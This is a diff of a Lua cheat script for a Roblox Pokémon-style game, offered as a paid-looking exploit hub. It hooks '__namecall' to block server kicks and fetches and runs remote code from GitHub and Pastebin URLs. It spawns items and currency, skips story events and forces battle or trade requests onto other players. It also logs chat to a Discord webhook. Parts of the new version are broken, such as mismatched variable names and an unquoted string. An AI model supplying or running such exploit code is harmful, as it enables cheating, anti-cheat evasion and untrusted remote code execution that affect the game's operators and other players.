@@ -1,62 +1,63 @@
 local plr = game:GetService("Players").LocalPlayer
-
-local itemid1 = "pokeball"
-local q1 = 1
-local q2 = 1
-local q3 = 1
-
 local cclosure = syn_newcclosure or newcclosure or nil
-
-local GetMainData = function()
-    for i, v in pairs(debug.getregistry()) do
-        if typeof(v) == "function" then
-            for a, b in pairs(debug.getupvalues(v)) do
-                if typeof(b) == "table" and rawget(b, "NPCChat") then
-                    return b
-                end
-            end
+if not cclosure or not hookmetamethod then
+    plr:Kick("\nUnsupported Exploit")
+end
+local localPlayer = game:GetService("Players").LocalPlayer
+local item1 = "pokeball"
+local qy = 1
+local _p = nil
+for _, v in pairs(getgc(true)) do
+    if typeof(v) == "table" then
+        if rawget(v, "PlayerData") then
+            _p = v
+            break
         end
     end
 end
-local _p = GetMainData()
-local currentChunk = _p.DataManager.currentChunk
+
+local forcebattle = function(player)
+    _p.Network:post("BattleRequest",player,{accepted = true})
+end;
+
+local forcetrade = function(player)
+    _p.Network:post("TradeRequest",player,{accepted = true})
+end;
+
+local chunkrev = function(obj)
+    spawn(function()
+            _p.Network:get("DataRequest",{"ChunkReceived",obj})
+    end)
+end;
+
+local autowin = function(splayer)
+    local battle = _p.Battle.currentBattle
+    battle:send("forfeit", splayer)
+end;
 
 local spawnitem = function(itemid, q)
     for i = 1, q do
         _p.Network:get("PDS", "giveItem", itemid, 1, true)
         _p.Network:get("PDS", "takeItem", 1)
     end
-end
+end;
 
 local spawntix = function(q)
     _p.Network:get("PDS", "AlolanReward", q / 2)
-end
+end;
+
+local changetitle = function(text, color)
+    _p.Network:post("UpdateTitle","Winner" .. text .. "Winner", color)
+end;
+
+local spoofbattlejoin = function(splayer)
+    _p.Battle.currentBattle:send("forfeit","join",splayer,"spoofed",{1})
+end;
 
 local beatgym = function(gym)
-    local index = {
-        109,
-        112,
-        113,
-        98,
-        126,
-        147,
-        154,
-        173
-    }
+    local index = {109, 112, 113, 98, 126, 147,154, 173}
     local battle =
-        _p.Network:get(
-        "BattleFunction",
-        "new",
-        {
-            ["expShare"] = false,
-            ["battleType"] = 1,
-            ["nnalp"] = false,
-            ["isDay"] = true,
-            ["chunkId"] = "chunk1",
-            ["regionId"] = "Route 1",
-            ["trainerId"] = index[gym] or 1
-        }
-    )
+    _p.Network:get("BattleFunction","new",{["expShare"] = false,["battleType"] = 1,["nnalp"] = false,["isDay"] = true,["chunkId"] = "chunk1",["regionId"] = "Route 1",["trainerId"] = index[gym] or 1})
     _p.Network:post("BattleEvent", battle.battleId, "join", 1, ";)")
     wait(1)
     _p.Network:post("BattleEvent", battle.battleId, "forfeit", "p2")
@@ -64,45 +65,35 @@ local beatgym = function(gym)
 end
 
 local oldNamecall
-oldNamecall =
-    hookmetamethod(
-    game,
-    "__namecall",
-    cclosure(
-        function(self, ...)
-            local NamecallMethod = getnamecallmethod()
-            local args = {...}
+oldNamecall = hookmetamethod(game, "__namecall", cclosure(function(self,...)
+   local NamecallMethod = getnamecallmethod()
+   local args = {...}
+   
+   if (NamecallMethod == "Kick" or NamecallMethod == "kick") and not checkcaller() then
+       if self ~= plr then
+           return oldNamecall(self,...)
+       end
+       return
+   end
+   
+   return oldNamecall(self,...)
+end))
 
-            if (NamecallMethod == "Kick" or NamecallMethod == "kick") and not checkcaller() then
-                if self ~= plr then
-                    return oldNamecall(self, ...)
-                end
-                return
-            end
-            return oldNamecall(self, ...)
-        end
-    )
-)
 game:GetService("ScriptContext"):SetTimeout(0.1)
 local Mercury = loadstring(game:HttpGet("https://raw.githubusercontent.com/bigbootylatinas/mew/main/main"))()
-loadstring(game:HttpGetAsync("https://pastebin.com/raw/JRNRs12Y", true))()
-if syn then
-syn.protect_gui(game:GetService("CoreGui"))
-syn.protect_gui(game:GetService("StarterGui"))
+if syn and syn.protect_gui then
+    syn.protect_gui(game:GetService("CoreGui"))
+    syn.protect_gui(game:GetService("StarterGui"))
 end
 wait(.4)
 
 local GUI =
     Mercury:Create {
-    Name = "MewHub",
+    Name = "$15 script",
     Size = UDim2.fromOffset(600, 400),
     Theme = Mercury.Themes.Serika,
     Link = "https://mewhub.com"
 }
-
---[[
-    MAIN
-]]
 
 local Tab =
     GUI:Tab {
@@ -111,35 +102,105 @@ local Tab =
 }
 
 Tab:Button {
-    Name = "Add Hide/Unhide Button👻",
+    Name = "Hide/Unhide Button👻",
     Description = nil,
     Callback = function()
-       
-local Material = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/MaterialLua/master/Module.lua"))()
+        local Material =
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/MaterialLua/master/Module.lua"))()
 
-local UI = Material.Load({
-     Title = "Minimize Mewhub",
-     Style = 4,
-     SizeX = 180,
-     SizeY = 80,
-     Theme = "Dark"
-})
+        local UI =
+            Material.Load(
+            {
+                Title = "Minimize Mewhub",
+                Style = 4,
+                SizeX = 180,
+                SizeY = 80,
+                Theme = "Dark"
+            }
+        )
 
-local Page = UI.New({
-    Title = "Main"
-})
+        local Page =
+            UI.New(
+            {
+                Title = "Main"
+            }
+        )
 
-Page.Button({
-    Text = "👻 hide/unhide",
-    Callback = function()
-        game:GetService("VirtualInputManager"):SendKeyEvent(true,Enum.KeyCode.LeftAlt,false,game)
-    end
-})
-
+        Page.Button(
+            {
+                Text = "👻 hide/unhide",
+                Callback = function()
+                    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.LeftAlt, false, game)
+                end
+            }
+        )
     end
 }
 
-Tab:Button {
+local section = Tab:section{
+    Name = "Main" -- default
+  }
+
+  section:Button {
+    Name = "Heal 💟",
+    Description = nil,
+    Callback = function()
+        _p.Network:get("PDS", "getPartyPokeBalls")
+    end
+}
+section:Button {
+    Name = "Open Map 🗺️",
+    Description = nil,
+    Callback = function()
+        _p.Menu.Map:fly()
+    end
+}
+section:Button {
+    Name = "Unstuck 🔓",
+    Description = nil,
+    Callback = function()
+        _p.Menu.options:getUnstuck(true)
+    end
+}
+section:Toggle {
+    Name = "Toggle Repel 🏃🐶",
+    StartingState = false,
+    Description = nil,
+    Callback = function(value)
+        if value then
+            _p.Repel.steps = 1000000
+        else
+            _p.Repel.steps = 0
+        end
+        Enabled = false
+    end
+}
+
+local section = Tab:section{
+    Name = "Pokemon" -- default
+  }
+
+section:Button {
+    Name = "Open Party List 🐶",
+    Description = nil,
+    Callback = function()
+        syn.secure_call(_p.Menu.party.open, localPlayer.PlayerScripts.ChatScript, _p.Menu.party)
+    end
+}
+
+section:Button {
+    Name = "Open PC 🖥️",
+    Description = nil,
+    Callback = function()
+        syn.secure_call(_p.Menu.pc.bootUp, localPlayer.PlayerScripts.ChatScript, _p.Menu.pc)
+    end
+}
+
+local section = Tab:section{
+    Name = "Skip" -- default
+  }
+
+  section:Button {
     Name = "Beat All Gyms 🥇",
     Description = nil,
     Callback = function()
@@ -148,29 +209,15 @@ Tab:Button {
         end
     end
 }
-Tab:Button {
+section:Button {
     Name = "Skip Chat (Slightly Bugged) ⏭️",
     Description = nil,
     Callback = function()
-        Get = game:GetService("ReplicatedStorage").GET
-        function GetMainData()
-            for i, v in pairs(debug.getregistry()) do
-                if typeof(v) == "function" then
-                    for a, b in pairs(debug.getupvalues(v)) do
-                        if typeof(b) == "table" and rawget(b, "Fishing") then
-                            return b
-                        end
-                    end
-                end
-            end
-        end
-        Data = GetMainData()
-        AuthKey = debug.getupvalue(Data["Network"]["getAuthKey"], 1)
         local SkipChat = true
         local OldWait
         OldWait =
             hookfunction(
-            Data["NPCChat"]["AdvanceSignal"]["wait"],
+            _p.NPCChat.AdvanceSignal:wait(),
             function(...)
                 if SkipChat then
                     return
@@ -179,9 +226,8 @@ Tab:Button {
             end
         )
         local Old
-        Old =
-            hookfunction(
-            Data["NPCChat"]["say"],
+        Old = hookfunction(
+            _p.NPCChat:say(),
             function(...)
                 local Args = {...}
                 if SkipChat then
@@ -192,366 +238,175 @@ Tab:Button {
                     end
                 end
                 return Old(unpack(Args))
-            end
-        )
+        end)
     end
 }
-Tab:Button {
-    Name = "Heal 💟",
-    Description = nil,
-    Callback = function()
-        Get = game:GetService("ReplicatedStorage").GET
-        function GetMainData()
-            for i, v in pairs(debug.getregistry()) do
-                if typeof(v) == "function" then
-                    for a, b in pairs(debug.getupvalues(v)) do
-                        if typeof(b) == "table" and rawget(b, "Fishing") then
-                            return b
-                        end
-                    end
-                end
-            end
+local section = Tab:section{
+    Name = "Hoverboard" -- default
+  }
+section:dropdown(
+    {
+        Name = "Set Hoverboard 🛹",
+        StartingText = "Hoverboard..",
+        Items = {
+            {"Red", "Basic Red"},
+            {"Yellow", "Basic Yellow"},
+            {"Pink", "Basic Pink"},
+            {"Green", "Basic Green"},
+            {"White", "Basic White"},
+            {"Gray", "Basic Grey"},
+            {"Black", "Basic Black"},
+            {"Blue", "Basic Blue"}
+        },
+        Description = "Sets your hoverboard to a specific color!",
+        Callback = function(selectedOption)
+            _p.Network:get("PDS", "setHoverboard", selectedOption)
         end
-        Data = GetMainData()
-        AuthKey = debug.getupvalue(Data["Network"]["getAuthKey"], 1)
-        local key = game:GetService("UserInputService")
-        Get:InvokeServer(AuthKey, "PDS", "getPartyPokeBalls")
-    end
-}
-Tab:Button {
-    Name = "Open Map 🗺️",
-    Description = nil,
-    Callback = function()
-        Get = game:GetService("ReplicatedStorage").GET
-        function GetMainData()
-            for i, v in pairs(debug.getregistry()) do
-                if typeof(v) == "function" then
-                    for a, b in pairs(debug.getupvalues(v)) do
-                        if typeof(b) == "table" and rawget(b, "Fishing") then
-                            return b
-                        end
-                    end
-                end
-            end
+    }
+)
+
+section:dropdown(
+    {
+        Name = "Set Paid Bord 🛹",
+        StartingText = "Hoverboard..",
+        Items = {
+            {"Banana", "Banana"},
+            {"Rotom", "Rotom"}
+        },
+        Description = "Sets your hoverboard to a specific color!",
+        Callback = function(selectedOption)
+            _p.Network:get("PDS", "setHoverboard", selectedOption)
         end
-        Data = GetMainData()
-        AuthKey = debug.getupvalue(Data["Network"]["getAuthKey"], 1)
-        local SF = {}
-        SF["Fly"] = Data["Menu"]["map"]["fly"]
-        SF["Fly"](unpack(SF))
-    end
-}
-Tab:Button {
-    Name = "Unstuck 🔓",
-    Description = nil,
-    Callback = function()
-        local _p = nil
-        for _, v in pairs(getgc(true)) do
-            if typeof(v) == "table" then
-                if rawget(v, "PlayerData") then
-                    _p = v
-                    break
-                end
-            end
-        end
-        _p.Menu.options:getUnstuck(true)
-    end
-}
-Tab:Toggle {
-    Name = "Toggle Repel 🏃🐶",
-    StartingState = false,
-    Description = nil,
-    Callback = function(value)
-        if value then
-            local _p = nil
-            for _, v in pairs(getgc(true)) do
-                if typeof(v) == "table" then
-                    if rawget(v, "PlayerData") then
-                        _p = v
-                        break
-                    end
-                end
-            end
-            _p.Repel.steps = 1000000
-        else
-            local _p = nil
-            for _, v in pairs(getgc(true)) do
-                if typeof(v) == "table" then
-                    if rawget(v, "PlayerData") then
-                        _p = v
-                        break
-                    end
-                end
-            end
-            _p.Repel.steps = 0
-        end
-        Enabled = false
-    end
-}
+    }
+)
+ --
 
 --[[
     STORY SKIPS
-]]--
-local Tab =
+]] local Tab =
     GUI:Tab {
     Name = "Story",
     Icon = "rbxassetid://10441188531"
 }
-Tab:Button {
+
+local section = Tab:section{
+    Name = "Skip Story" -- default
+  }
+
+  section:Button {
     Name = "Skip Meeting Jake",
     Description = nil,
     Callback = function()
         local _p = nil
         for _, v in pairs(getgc(true)) do
-            if typeof(v) == "table" then
-                if rawget(v, "PlayerData") then
-                    _p = v
-                    break
-                end
-            end
+            print(_p.PlayerData:completeEvent("MeetJake"))
         end
-        print(_p.PlayerData:completeEvent("MeetJake"))
     end
 }
-Tab:Button {
+section:Button {
     Name = "Skip Meeting Parents",
     Description = nil,
     Callback = function()
-        local _p = nil
-        for _, v in pairs(getgc(true)) do
-            if typeof(v) == "table" then
-                if rawget(v, "PlayerData") then
-                    _p = v
-                    break
-                end
-            end
-        end
         print(_p.PlayerData:completeEvent("MeetParents"))
     end
 }
-Tab:Button {
+section:Button {
     Name = "Skip Parents Kidnapped",
     Description = nil,
     Callback = function()
-        local _p = nil
-        for _, v in pairs(getgc(true)) do
-            if typeof(v) == "table" then
-                if rawget(v, "PlayerData") then
-                    _p = v
-                    break
-                end
-            end
-        end
         print(_p.PlayerData:completeEvent("ParentsKidnappedScene"))
     end
 }
-Tab:Button {
+section:Button {
     Name = "Skip Jake Battle",
     Description = nil,
     Callback = function()
-        local _p = nil
-        for _, v in pairs(getgc(true)) do
-            if typeof(v) == "table" then
-                if rawget(v, "PlayerData") then
-                    _p = v
-                    break
-                end
-            end
-        end
         print(_p.PlayerData:completeEvent("JakeBattle1"))
     end
 }
-Tab:Button {
+section:Button {
     Name = "Skip Thief Convo",
     Description = nil,
     Callback = function()
-        local _p = nil
-        for _, v in pairs(getgc(true)) do
-            if typeof(v) == "table" then
-                if rawget(v, "PlayerData") then
-                    _p = v
-                    break
-                end
-            end
-        end
         print(_p.PlayerData:completeEvent("BronzeBrickStolen"))
     end
 }
-Tab:Button {
+section:Button {
     Name = "Track The Thief",
     Description = nil,
     Callback = function()
-        local _p = nil
-        for _, v in pairs(getgc(true)) do
-            if typeof(v) == "table" then
-                if rawget(v, "PlayerData") then
-                    _p = v
-                    break
-                end
-            end
-        end
         print(_p.PlayerData:completeEvent("JakeTracksLinda"))
         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-262.576, 65.0785, -862.594)
     end
 }
-Tab:Button {
+section:Button {
     Name = "Introduced To First Gym",
     Description = nil,
     Callback = function()
-        local _p = nil
-        for _, v in pairs(getgc(true)) do
-            if typeof(v) == "table" then
-                if rawget(v, "PlayerData") then
-                    _p = v
-                    break
-                end
-            end
-        end
         print(_p.PlayerData:completeEvent("IntroducedToGym1"))
     end
 }
-Tab:Button {
+section:Button {
     Name = "Skip Jake Battle 2",
     Description = nil,
     Callback = function()
-        local _p = nil
-        for _, v in pairs(getgc(true)) do
-            if typeof(v) == "table" then
-                if rawget(v, "PlayerData") then
-                    _p = v
-                    break
-                end
-            end
-        end
-        print(_p.PlayerData:completeEvent("JakeBattle2"))
+        print(_p.PlayerData:completeEvent("JakeBattle2")) -- Work on
     end
 }
-Tab:Button {
-    Name = "Skip Talk To Jake + Seb",
+section:Button {
+    Name = "Skip Brimber Talk",
     Description = nil,
     Callback = function()
-        local _p = nil
-        for _, v in pairs(getgc(true)) do
-            if typeof(v) == "table" then
-                if rawget(v, "PlayerData") then
-                    _p = v
-                    break
-                end
-            end
-        end
-        print(_p.PlayerData:completeEvent("GroudonScene"))
-    end
-}
-Tab:Button {
-    Name = "Skip Groundon Scene",
-    Description = nil,
-    Callback = function()
-        local _p = nil
-        for _, v in pairs(getgc(true)) do
-            if typeof(v) == "table" then
-                if rawget(v, "PlayerData") then
-                    _p = v
-                    break
-                end
-            end
-        end
         print(_p.PlayerData:completeEvent("TalkToJakeAndSebastian"))
     end
 }
-Tab:Button {
+section:Button {
+    Name = "Skip Groundon Scene",
+    Description = nil,
+    Callback = function()
+        print(_p.PlayerData:completeEvent("GroudonScene"))
+    end
+}
+section:Button {
     Name = "Skip Following Jake",
     Description = nil,
     Callback = function()
-        local _p = nil
-        for _, v in pairs(getgc(true)) do
-            if typeof(v) == "table" then
-                if rawget(v, "PlayerData") then
-                    _p = v
-                    break
-                end
-            end
-        end
         _p.PlayerData:completeEvent("JakeStartFollow")
         _p.PlayerData:completeEvent("JakeEndFollow")
     end
 }
-Tab:Button {
+section:Button {
     Name = "Skip Rosecove Welcome",
     Description = nil,
     Callback = function()
-        local _p = nil
-        for _, v in pairs(getgc(true)) do
-            if typeof(v) == "table" then
-                if rawget(v, "PlayerData") then
-                    _p = v
-                    break
-                end
-            end
-        end
         _p.PlayerData:completeEvent("RosecoveWelcome")
     end
 }
-Tab:Button {
+section:Button {
     Name = "Skip Lighthouse Scene",
     Description = nil,
     Callback = function()
-        local _p = nil
-        for _, v in pairs(getgc(true)) do
-            if typeof(v) == "table" then
-                if rawget(v, "PlayerData") then
-                    _p = v
-                    break
-                end
-            end
-        end
         _p.PlayerData:completeEvent("LighthouseScene")
     end
 }
-Tab:Button {
+section:Button {
     Name = "Skip Cypress After Gym 3",
     Description = nil,
     Callback = function()
-        local _p = nil
-        for _, v in pairs(getgc(true)) do
-            if typeof(v) == "table" then
-                if rawget(v, "PlayerData") then
-                    _p = v
-                    break
-                end
-            end
-        end
         _p.PlayerData:completeEvent("ProfAfterGym3")
     end
 }
-Tab:Button {
-    Name = "Skip Jake + Tess Goodbyes",
+section:Button {
+    Name = "Skip Jake/Tess Goodbyes",
     Description = nil,
     Callback = function()
-        local _p = nil
-        for _, v in pairs(getgc(true)) do
-            if typeof(v) == "table" then
-                if rawget(v, "PlayerData") then
-                    _p = v
-                    break
-                end
-            end
-        end
         _p.PlayerData:completeEvent("JakeAndTessDepart")
     end
 }
-Tab:Button {
+section:Button {
     Name = "Gym 4 Tools Giver",
     Description = nil,
     Callback = function()
-        local _p = nil
-        for _, v in pairs(getgc(true)) do
-            if typeof(v) == "table" then
-                if rawget(v, "PlayerData") then
-                    _p = v
-                    break
-                end
-            end
-        end
         _p.PlayerData:completeEvent("G4FoundTape")
         _p.PlayerData:completeEvent("G4GaveTape")
         _p.PlayerData:completeEvent("G4FoundWrench")
@@ -564,7 +419,6 @@ Tab:Button {
 --[[
     BREEDING
 ]]
-
 local Tab =
     GUI:Tab {
     Name = "Breeding",
@@ -599,24 +453,21 @@ Tab:Button {
         )
     end
 }
-Tab:Button {
-    Name = "PC - Lagoona",
-    Description = nil,
-    Callback = function()
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(312, 110, -1066)
-    end
-}
 
 --[[
     MISC
 ]]
-
 local Tab =
     GUI:Tab {
     Name = "Misc",
     Icon = "rbxassetid://10440794784"
 }
-Tab:Button {
+
+local section = Tab:section{
+    Name = "FPS" -- default
+  }
+
+  section:Button {
     Name = "Material Remover",
     Description = nil,
     Callback = function()
@@ -651,7 +502,11 @@ Tab:Button {
     end
 }
 
-Tab:Textbox {
+local section = Tab:section{
+    Name = "Chat" -- default
+  }
+
+  section:Textbox {
     Name = "Chat Logger (insert discord webhook)",
     Callback = function(value)
         local marketplaceService = game:GetService("MarketplaceService")
@@ -707,7 +562,7 @@ Tab:Textbox {
     end
 }
 
-Tab:Button {
+section:Button {
     Name = "Chat Translator",
     Description = nil,
     Callback = function()
@@ -715,15 +570,11 @@ Tab:Button {
     end
 }
 
-Tab:Button {
-    Name = "Server Browser",
-    Description = nil,
-    Callback = function()
-        loadstring(game:HttpGet("https://www.scriptblox.com/raw/Server-Browser_80", true))();
-    end
-}
+local section = Tab:section{
+    Name = "Movement" -- default
+  }
 
-Tab:Button {
+  section:Button {
     Name = "Ctrl + TP",
     Description = nil,
     Callback = function()
@@ -743,7 +594,7 @@ Tab:Button {
     end
 }
 
-Tab:Button {
+section:Button {
     Name = "Noclip + Fly [Toggle - X]",
     Description = nil,
     Callback = function()
@@ -751,11 +602,23 @@ Tab:Button {
     end
 }
 
-Tab:Button {
+local section = Tab:section{
+    Name = "Servers" -- default
+  }
+
+  section:Button {
     Name = "Rejoin",
     Description = nil,
     Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Rejoin-Game/main/Rejoin%20Game.lua"))()
+    end
+}
+
+section:Button {
+    Name = "Server Browser",
+    Description = nil,
+    Callback = function()
+        loadstring(game:HttpGet("https://www.scriptblox.com/raw/Server-Browser_80", true))()
     end
 }
 --[[
@@ -766,8 +629,13 @@ local Tab =
     Name = "Shops",
     Icon = "rbxassetid://10440803307"
 }
-Tab:Button {
-    Name = "Pokemart",
+
+local section = Tab:section{
+    Name = "Stores" -- default
+  }
+
+  section:Button {
+    Name = "Pokemart 🏪",
     Description = nil,
     Callback = function()
         local _p = nil
@@ -782,8 +650,8 @@ Tab:Button {
         _p.Menu.shop:open()
     end
 }
-Tab:Button {
-    Name = "BP Shop",
+section:Button {
+    Name = "BP Shop 🏬",
     Description = nil,
     Callback = function()
         local _p = nil
@@ -798,8 +666,8 @@ Tab:Button {
         _p.Menu.battleShop:open()
     end
 }
-Tab:Button {
-    Name = "Stoneshop",
+section:Button {
+    Name = "Stoneshop 🧱",
     Description = nil,
     Callback = function()
         local _p = nil
@@ -814,8 +682,8 @@ Tab:Button {
         _p.Menu.shop:open("stnshp")
     end
 }
-Tab:Button {
-    Name = "Buy Sushi (gives berries + prism scales",
+section:Button {
+    Name = "Buy Sushi (gives berries + prism scales) 🍣",
     Description = nil,
     Callback = function()
         local _p = nil
@@ -842,18 +710,6 @@ Tab:Button {
     Name = "Absol + Eevee",
     Description = nil,
     Callback = function()
-        local _p = nil
-        for _, v in pairs(getgc(true)) do
-            if typeof(v) == "table" then
-                if rawget(v, "PlayerData") then
-                    _p = v
-                    break
-                end
-            end
-        end
-
-        --print(_p.PlayerData:completeEvent("ReceiveRTD"))
-        --print(_p.PlayerData:completeEvent("RunningShoes"))
         print(_p.PlayerData:completeEvent("GetAbsol"))
         print(_p.PlayerData:completeEvent("Eevee2Awarded"))
     end
@@ -862,81 +718,43 @@ Tab:Button {
     Name = "Enable RTD + Running",
     Description = nil,
     Callback = function()
-        local _p = nil
-        for _, v in pairs(getgc(true)) do
-            if typeof(v) == "table" then
-                if rawget(v, "PlayerData") then
-                    _p = v
-                    break
-                end
-            end
-        end
         _p.Menu.rtd:enable()
         _p.RunningShoes:enable()
     end
 }
-Tab:Button {
+
+local section = Tab:section{
+    Name = "Items" -- default
+  }
+
+  section:Button {
     Name = "Give Leftovers (1x use)",
     Description = nil,
     Callback = function()
-        local _p = nil
-        for _, v in pairs(getgc(true)) do
-            if typeof(v) == "table" then
-                if rawget(v, "PlayerData") then
-                    _p = v
-                    break
-                end
-            end
-        end
         print(_p.PlayerData:completeEvent("GivenLeftovers"))
     end
 }
-Tab:Button {
+section:Button {
     Name = "Give Kings Rock (1x use)",
     Description = nil,
     Callback = function()
-        local _p = nil
-        for _, v in pairs(getgc(true)) do
-            if typeof(v) == "table" then
-                if rawget(v, "PlayerData") then
-                    _p = v
-                    break
-                end
-            end
-        end
         print(_p.PlayerData:completeEvent("KingsRockGiven"))
     end
 }
+
+section:Button {
+    Name = "Gives SawsbuckCoffee (1x use)",
+    Description = nil,
+    Callback = function()
+        print(_p.PlayerData:completeEvent("GivenSawsbuckCoffee"))
+    end
+}
+
 Tab:Button {
     Name = "BlackWhite Egg (1x use)",
     Description = nil,
     Callback = function()
-        local _p = nil
-        for _, v in pairs(getgc(true)) do
-            if typeof(v) == "table" then
-                if rawget(v, "PlayerData") then
-                    _p = v
-                    break
-                end
-            end
-        end
         print(_p.PlayerData:completeEvent("ReceivedBWEgg"))
-    end
-}
-Tab:Button {
-    Name = "Gives SawsbuckCoffee (1x use)",
-    Description = nil,
-    Callback = function()
-        local _p = nil
-        for _, v in pairs(getgc(true)) do
-            if typeof(v) == "table" then
-                if rawget(v, "PlayerData") then
-                    _p = v
-                    break
-                end
-            end
-        end
-        print(_p.PlayerData:completeEvent("GivenSawsbuckCoffee"))
     end
 }
 --[[
@@ -947,7 +765,12 @@ local Tab =
     Name = "Currency",
     Icon = "rbxassetid://10440868155"
 }
-Tab:Button {
+
+local section = Tab:section{
+    Name = "Money" -- default
+  }
+
+  section:Button {
     Name = "PokeDollars (Risky) (max money) 😱💰",
     Description = nil,
     Callback = function()
@@ -955,27 +778,32 @@ Tab:Button {
             local index = {
                 181
             }
-            local battle = _p.Network:get('BattleFunction', 'new', {
-                ["expShare"] = false,
-                ["battleType"] = 1,
-                ["nnalp"] = false,
-                ["isDay"] = true,
-                ["chunkId"] = "chunk1",
-                ["regionId"] = "Route 1",
-                ["trainerId"] = index[gym] or 1
-            })
-            _p.Network:post('BattleEvent', battle.battleId, 'join', 1, ';)')
+            local battle =
+                _p.Network:get(
+                "BattleFunction",
+                "new",
+                {
+                    ["expShare"] = false,
+                    ["battleType"] = 1,
+                    ["nnalp"] = false,
+                    ["isDay"] = true,
+                    ["chunkId"] = "chunk1",
+                    ["regionId"] = "Route 1",
+                    ["trainerId"] = index[gym] or 1
+                }
+            )
+            _p.Network:post("BattleEvent", battle.battleId, "join", 1, ";)")
             wait(.1)
-            _p.Network:post('BattleEvent', battle.battleId, 'forfeit', 'p2')
-            _p.Network:post('BattleEvent', battle.battleId, 'destroy')
+            _p.Network:post("BattleEvent", battle.battleId, "forfeit", "p2")
+            _p.Network:post("BattleEvent", battle.battleId, "destroy")
         end
-        
-        for i = 1,3334 do
-                    beatgym(i)
-                end
+
+        for i = 1, 3334 do
+            beatgym(i)
+        end
     end
 }
-Tab:Button {
+section:Button {
     Name = "PokeDollars Less Risky (+$10080) 🤑💰",
     Description = nil,
     Callback = function()
@@ -983,27 +811,32 @@ Tab:Button {
             local index = {
                 181
             }
-            local battle = _p.Network:get('BattleFunction', 'new', {
-                ["expShare"] = false,
-                ["battleType"] = 1,
-                ["nnalp"] = false,
-                ["isDay"] = true,
-                ["chunkId"] = "chunk1",
-                ["regionId"] = "Route 1",
-                ["trainerId"] = index[gym] or 1
-            })
-            _p.Network:post('BattleEvent', battle.battleId, 'join', 1, ';)')
+            local battle =
+                _p.Network:get(
+                "BattleFunction",
+                "new",
+                {
+                    ["expShare"] = false,
+                    ["battleType"] = 1,
+                    ["nnalp"] = false,
+                    ["isDay"] = true,
+                    ["chunkId"] = "chunk1",
+                    ["regionId"] = "Route 1",
+                    ["trainerId"] = index[gym] or 1
+                }
+            )
+            _p.Network:post("BattleEvent", battle.battleId, "join", 1, ";)")
             wait(.1)
-            _p.Network:post('BattleEvent', battle.battleId, 'forfeit', 'p2')
-            _p.Network:post('BattleEvent', battle.battleId, 'destroy')
+            _p.Network:post("BattleEvent", battle.battleId, "forfeit", "p2")
+            _p.Network:post("BattleEvent", battle.battleId, "destroy")
         end
-        
-        for i = 1,4 do
-                    beatgym(i)
-                end
+
+        for i = 1, 4 do
+            beatgym(i)
+        end
     end
 }
-Tab:Button {
+section:Button {
     Name = "Tix (+25)💲",
     Description = nil,
     Callback = function()
@@ -1019,642 +852,674 @@ Tab:Button {
         _p.Network:get("PDS", "AlolanReward", 25)
     end
 }
+
 --[[
     Item Spawner
 ]]
 local Tab =
     GUI:Tab {
     Name = "Item Generator",
-    Icon = "rbxassetid://10469697250"
+    Icon = "rbxassetid://10441107015"
 }
-Tab:Textbox {
+
+local section = Tab:section{
+    Name = "Name / Quantity" -- default
+  }
+
+  section:Textbox {
     Name = "Insert Item Name 🗳️",
     Callback = function(str)
-        itemid1 = tostring(str)
+        item1 = tostring(str)
     end
 }
-Tab:Textbox {
+section:Textbox {
     Name = "Insert Quantity 🗳️",
     Callback = function(str)
-        q1 = tonumber(str)
+        qy = tonumber(str)
     end
 }
 
-Tab:Button {
+local section = Tab:section{
+    Name = "Spawner" -- default
+  }
+
+  section:Button {
     Name = "Spawn Item ✨",
-    Description = nil,
+    Description = doesn't work in every pbb game,
     Callback = function()
-        if(itemid1 == "shinystar") then itemid1 = ""
-            end
-            if(itemid1 == "bottlecap") then itemid1 = ""
-                end
-                if(itemid1 == "mewtwoitey") then itemid1 = ""
-                    end
-                    if(itemid1 == "mewtwoitex") then itemid1 = ""
-                        end
-                        if(itemid1 == "latiasite") then itemid1 = ""
-                            end
-                            if(itemid1 == "latiosite") then itemid1 = ""
-                                end
-				 if(itemid1 == "redorb") then itemid1 = ""
-                                end 
-				if(itemid1 == "blueorb") then itemid1 = ""
-                                end 
-				
-				
-			if(itemid1 == "adamantmint") then itemid1 = ""
-                        end
-                        if(itemid1 == "boldmint") then itemid1 = ""
-                            end
-                            if(itemid1 == "bravemint") then itemid1 = ""
-                                end
-				 if(itemid1 == "calmmint") then itemid1 = ""
-                                end 
-				if(itemid1 == "carefulmint") then itemid1 = ""
-                                end 
-				if(itemid1 == "gentlemint") then itemid1 = ""
-                        end
-                        if(itemid1 == "hastymint") then itemid1 = ""
-                            end
-                            if(itemid1 == "implishmint") then itemid1 = ""
-                                end
-				 if(itemid1 == "jollymint") then itemid1 = ""
-                                end 
-				if(itemid1 == "laxmint") then itemid1 = ""
-                                end 
-				if(itemid1 == "lonelymint") then itemid1 = ""
-                        end
-                        if(itemid1 == "mildmint") then itemid1 = ""
-                            end
-                            if(itemid1 == "modestmint") then itemid1 = ""
-                                end
-				 if(itemid1 == "naivemint") then itemid1 = ""
-                                end 
-				if(itemid1 == "naughtymint") then itemid1 = ""
-                                end 
-				if(itemid1 == "quietmint") then itemid1 = ""
-                        end
-                        if(itemid1 == "rashmint") then itemid1 = ""
-                            end
-                            if(itemid1 == "relaxedmint") then itemid1 = ""
-                                end
-				 if(itemid1 == "sassymint") then itemid1 = ""
-                                end 
-				if(itemid1 == "seriousmint") then itemid1 = ""
-                                end 
-				if(itemid1 == "timidmint") then itemid1 = ""
-                        end
 
-				
-				
-				
-        spawnitem(itemid1, q1)
+
+        -- limits
+        if(itemid1 == "shinystar") then itemid1 = ""
+        end
+        if(itemid1 == "bottlecap") then itemid1 = ""
+            end
+            if(itemid1 == "mewtwoitey") then itemid1 = ""
+                end
+                if(itemid1 == "mewtwoitex") then itemid1 = ""
+                    end
+                    if(itemid1 == "latiasite") then itemid1 = ""
+                        end
+                        if(itemid1 == "latiosite") then itemid1 = ""
+                            end
+             if(itemid1 == "redorb") then itemid1 = ""
+                            end 
+            if(itemid1 == "blueorb") then itemid1 = ""
+                            end 
+            
+            
+        if(itemid1 == "adamantmint") then itemid1 = ""
+                    end
+                    if(itemid1 == "boldmint") then itemid1 = ""
+                        end
+                        if(itemid1 == "bravemint") then itemid1 = ""
+                            end
+             if(itemid1 == "calmmint") then itemid1 = ""
